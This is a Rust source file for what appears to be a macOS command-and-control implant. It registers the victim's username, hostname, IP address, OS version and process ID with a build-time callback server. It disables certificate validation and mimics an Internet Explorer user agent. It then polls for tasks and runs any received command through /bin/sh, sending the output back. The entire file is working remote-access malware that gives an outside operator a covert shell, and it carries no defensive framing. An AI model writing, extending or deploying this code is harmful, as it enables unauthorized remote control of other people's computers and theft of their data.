use reqwest::blocking::Client;
use serde::{Deserialize, Serialize};
use std::env;
use std::net::UdpSocket;
use std::process::Command;
use std::sync::atomic::{AtomicU64, Ordering};

const CALLBACK: &str = env!("CALLBACK");
const UA: &str = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

// ── Sleep configuration ───────────────────────────────────────────────────────

static SLEEP_SECONDS: AtomicU64 = AtomicU64::new(5);

fn get_sleep_seconds() -> u64 {
    SLEEP_SECONDS.load(Ordering::Relaxed)
}

fn set_sleep_seconds(seconds: u64) {
    SLEEP_SECONDS.store(seconds, Ordering::Relaxed);
}

// ── Wire types ───────────────────────────────────────────────────────────────

#[derive(Serialize)]
struct RegisterRequest {
    link_username: String,
    link_hostname: String,
    internal_ip: String,
    external_ip: String,
    platform: String,
    pid: u32,
}

#[derive(Serialize)]
struct CallbackRequest<'a> {
    q: &'a str,
    tasking: &'a str,
}

#[derive(Deserialize)]
struct TaskResponse {
    q: String,
    tasking: String,
    x_request_id: String,
}

// ── HTTP client ──────────────────────────────────────────────────────────────

fn build_client() -> Client {
    Client::builder()
        .danger_accept_invalid_certs(true)
        .cookie_store(true)
        .user_agent(UA)
        .build()
        .expect("reqwest client init failed")
}

// ── System info ──────────────────────────────────────────────────────────────

fn username() -> String {
    env::var("USER").unwrap_or_else(|_| "unknown".into())
}

/// Uses `scutil --get ComputerName` which is the canonical macOS hostname.
fn hostname() -> String {
    Command::new("scutil")
        .args(["--get", "ComputerName"])
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| {
            // Fallback to /etc/hostname or env
            std::fs::read_to_string("/etc/hostname")
                .unwrap_or_else(|_| "unknown".into())
                .trim()
                .to_string()
        })
}

fn local_ip() -> String {
    UdpSocket::bind("0.0.0.0:0")
        .ok()
        .and_then(|s| s.connect("8.8.8.8:80").ok().map(|_| s))
        .and_then(|s| s.local_addr().ok())
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|| "unknown".into())
}

/// Returns the macOS product name + version, e.g. "macOS 14.4.1".
fn platform_info() -> String {
    let name = Command::new("sw_vers")
        .arg("-productName")
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|| "macOS".into());

    let version = Command::new("sw_vers")
        .arg("-productVersion")
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|| "unknown".into());

    format!("{} {}", name, version)
}

// ── Main C2 loop ─────────────────────────────────────────────────────────────

pub fn link_loop() {
    let client = build_client();
    let base = format!("https://{}", CALLBACK);

    // Stage 1: establish session cookie
    loop {
        if client.get(format!("{}/js", base)).send().is_ok() {
            break;
        }
        sleep(get_sleep_seconds());
    }

    // Stage 2: register
    let reg = RegisterRequest {
        link_username: username(),
        link_hostname: hostname(),
        internal_ip: local_ip(),
        external_ip: String::new(),
        platform: platform_info(),
        pid: std::process::id(),
    };

    let mut x_req_id = loop {
        if let Ok(r) = client
            .post(format!("{}/static/register", base))
            .json(&reg)
            .send()
        {
            if let Ok(t) = r.json::<TaskResponse>() {
                break t.x_request_id;
            }
        }
        sleep(get_sleep_seconds());
    };

    // Stage 3: polling loop
    let mut prev_output = String::new();
    let mut prev_task_id = String::new();

    loop {
        let cb = CallbackRequest {
            q: &prev_output,
            tasking: &prev_task_id,
        };

        match client
            .post(format!("{}/static/get", base))
            .header("x-request-id", &x_req_id)
            .json(&cb)
            .send()
            .and_then(|r| r.json::<TaskResponse>())
        {
            Ok(task) => {
                x_req_id = task.x_request_id.clone();
                if task.q.is_empty() {
                    prev_output = String::new();
                    prev_task_id = String::new();
                } else if task.q == "exit" {
                    break;
                } else {
                    prev_output = dispatch(&task.q);
                    prev_task_id = task.tasking.clone();
                }
            }
            Err(_) => {
                prev_output = String::new();
                prev_task_id = String::new();
            }
        }

        sleep(get_sleep_seconds());
    }
}

// ── Command dispatch ─────────────────────────────────────────────────────────

fn dispatch(raw: &str) -> String {
    let (cmd, args) = split_first(raw);
    match cmd {
        "cd" => env::set_current_dir(args)
            .map(|_| String::new())
            .unwrap_or_else(|e| format!("[-] {}", e)),

        "pwd" => env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|e| format!("[-] {}", e)),

        "ls" => list_dir(if args.is_empty() { "." } else { args }),

        "pid" => std::process::id().to_string(),

        "whoami" => format!("{}@{}", username(), hostname()),

        "shell" => shell_exec(args),

        // fallback: pass through /bin/sh
        _ => shell_exec(raw),
    }
}

fn shell_exec(cmd: &str) -> String {
    match Command::new("/bin/sh").arg("-c").arg(cmd).output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() {
                out.push_str(&err);
            }
            out
        }
        Err(e) => format!("[-] {}", e),
    }
}

fn list_dir(path: &str) -> String {
    match std::fs::read_dir(path) {
        Ok(entries) => entries
            .flatten()
            .map(|e| {
                let name = e.file_name().to_string_lossy().into_owned();
                if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                    format!("{}/", name)
                } else {
                    name
                }
            })
            .collect::<Vec<_>>()
            .join("\n"),
        Err(e) => format!("[-] {}", e),
    }
}

// ── Helpers ──────────────────────────────────────────────────────────────────

fn split_first(s: &str) -> (&str, &str) {
    s.find(' ')
        .map(|i| (&s[..i], s[i + 1..].trim_start()))
        .unwrap_or((s, ""))
}

fn sleep(secs: u64) {
    std::thread::sleep(std::time::Duration::from_secs(secs));
}
